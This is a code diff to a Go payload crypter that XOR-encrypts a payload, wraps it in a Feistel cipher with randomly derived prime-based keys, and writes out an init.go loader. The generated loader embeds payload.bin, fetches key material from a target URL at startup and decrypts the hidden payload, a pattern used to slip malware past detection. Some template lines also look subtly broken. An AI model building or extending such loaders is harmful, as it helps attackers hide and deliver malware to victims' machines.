@@ -6,12 +6,14 @@ import (
 	"encoding/hex"
 	"flag"
 	"fmt"
+	"github.com/cyrildever/feistel"
 	"io"
 	"io/ioutil"
 	"log"
 	"math/rand"
 	"net/http"
 	"os"
+	"strconv"
 	"time"
 )
 
@@ -20,15 +22,77 @@ var Chars = []string{"A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L",
 const base = `package main
 import (
 	"io/ioutil"
+	"io"
 	"net/http"
+	"log"
+	"github.com/cyrildever/feistel"
+	"bytes"
+	_ "embed"
+	"fmt"
 )
+//go:embed payload.bin
+var payloadBin []byte
+var stringPayload string
+var DecryptedPayload []byte
+
 	var Payload []byte
+
+	func xor(f []byte, key string) []byte {
+	buf := make([]byte, 1)
+	bufw := []byte{}
+	reader := bytes.NewReader(f)
+	for {
+		n, err := reader.Read(buf)
+		if err != nil {
+			if err != io.EOF {
+				log.Fatal(err)
+			}
+			break
+		}
+		bite := byte(key[n%s(len(key))])
+		writebuf := make([]byte, 0)
+		writebuf = append(writebuf, bite)
+		xord, err := XORBytes(writebuf, buf[0:n])
+		bufw = append(bufw, xord[0])
+	}
+	return bufw
+}
+
+func XORBytes(a, b []byte) ([]byte, error) {
+	if len(a) != len(b) {
+		return nil, fmt.Errorf("length of byte slices is not equivalent: %s != %s", len(a), len(b))
+	}
+
+	buf := make([]byte, len(a))
+
+	for i := range a {
+		buf[i] = a[i] ^ b[i]
+	}
+
+	return buf, nil
+}
+
 	func init(){
 		Payload = make([]byte, 64)
 		r, _ := http.Get("%s")
 		defer r.Body.Close()
 		body, _ := ioutil.ReadAll(r.Body)
 		`
+
+const feistalSetup = `
+		keys := make([]string, %d)
+`
+
+const feistalKey = `
+		keys[%d] = "%s"
+`
+
+const feistalInit = `
+		cipher := feistel.NewCustomCipher(keys)
+		stringPayload, _ = cipher.Decrypt(payloadBin)
+		DecryptedPayload = xor([]byte(stringPayload), string(Payload))
+
+`
 
 //const StringTemplate = "Payload = append(Payload, []byte(%s)...)"
 //const IntTemplate = "Payload = append(Payload, body[%d])"
@@ -415,7 +479,7 @@ func XORBytes(a, b []byte) ([]byte, error) {
 	return buf, nil
 }
 
-func xor(f *os.File, key string) {
+func xor(f *os.File, key string) []byte {
 	buf := make([]byte, 1)
 	bufw := []byte{}
 	reader := bufio.NewReader(f)
@@ -433,11 +497,7 @@ func xor(f *os.File, key string) {
 		xord, err := XORBytes(writebuf, buf[0:n])
 		bufw = append(bufw, xord[0])
 	}
-	err := os.WriteFile("payload.bin", bufw, 0644)
-	if err != nil {
-		log.Fatal(err)
-		return
-	}
+	return bufw
 }
 
 func main() {
@@ -457,11 +517,47 @@ func main() {
 	xorSha.Write(test)
 	xorHash := xorSha.Sum(nil)
 	xorHashString := hex.EncodeToString(xorHash)
-	xor(payload, xorHashString)
+
+	firstXor := xor(payload, xorHashString)
+
+	numPrimes := rand.Intn(20) + 10
+
+	primes := make([]int, numPrimes)
+	for i := 0; i < numPrimes; i++ {
+		primes[i] = rand.Intn(1000000) + 10000
+	}
+
+	keyPrimes := make([]int, numPrimes)
+	for i := 0; i < numPrimes; i++ {
+		primeList := sieveOfEratosthenes(primes[i])
+		keyPrimes[i] = primeList[rand.Intn(len(primeList)-1)]
+	}
+	keys := make([]string, numPrimes)
+	for i := 0; i < len(keyPrimes); i++ {
+		keySha := sha256.New()
+		keySha.Write([]byte(strconv.Itoa(keyPrimes[i]) + xorHashString))
+		keyHash := keySha.Sum(nil)
+		keys[i] = hex.EncodeToString(keyHash)
+	}
+
+	cipher := feistel.NewCustomCipher(keys)
+
+	payloadBytes, err := cipher.Encrypt(string(firstXor))
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	os.WriteFile("payload.bin", payloadBytes, 0644)
 
 	f, _ := os.OpenFile("init.go", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	defer f.Close()
-	f.Write([]byte(fmt.Sprintf(base, targetUrl)))
+	f.Write([]byte(fmt.Sprintf(base, "%", "d", "d", targetUrl)))
+
+	f.Write([]byte(fmt.Sprintf(feistalSetup, len(keys))))
+	for i := 0; i < len(keys); i++ {
+		f.Write([]byte(fmt.Sprintf(feistalKey, i, keys[i])))
+	}
+
 	for i := 0; i < len(xorHashString); i++ {
 
 		char := string(xorHashString[i])
@@ -474,6 +570,21 @@ func main() {
 			f.Write([]byte("\n" + fmt.Sprintf(IntTemplate, i, intMaps[rand.Intn(len(intMaps)-1)])))
 		}
 	}
+	f.Write([]byte(fmt.Sprintf(feistalInit)))
 	f.Write([]byte("\n" + end))
 
+}
+
+func sieveOfEratosthenes(N int) (primes []int) {
+	b := make([]bool, N)
+	for i := 2; i < N; i++ {
+		if b[i] == true {
+			continue
+		}
+		primes = append(primes, i)
+		for k := i * i; k < N; k += i {
+			b[k] = true
+		}
+	}
+	return
 }
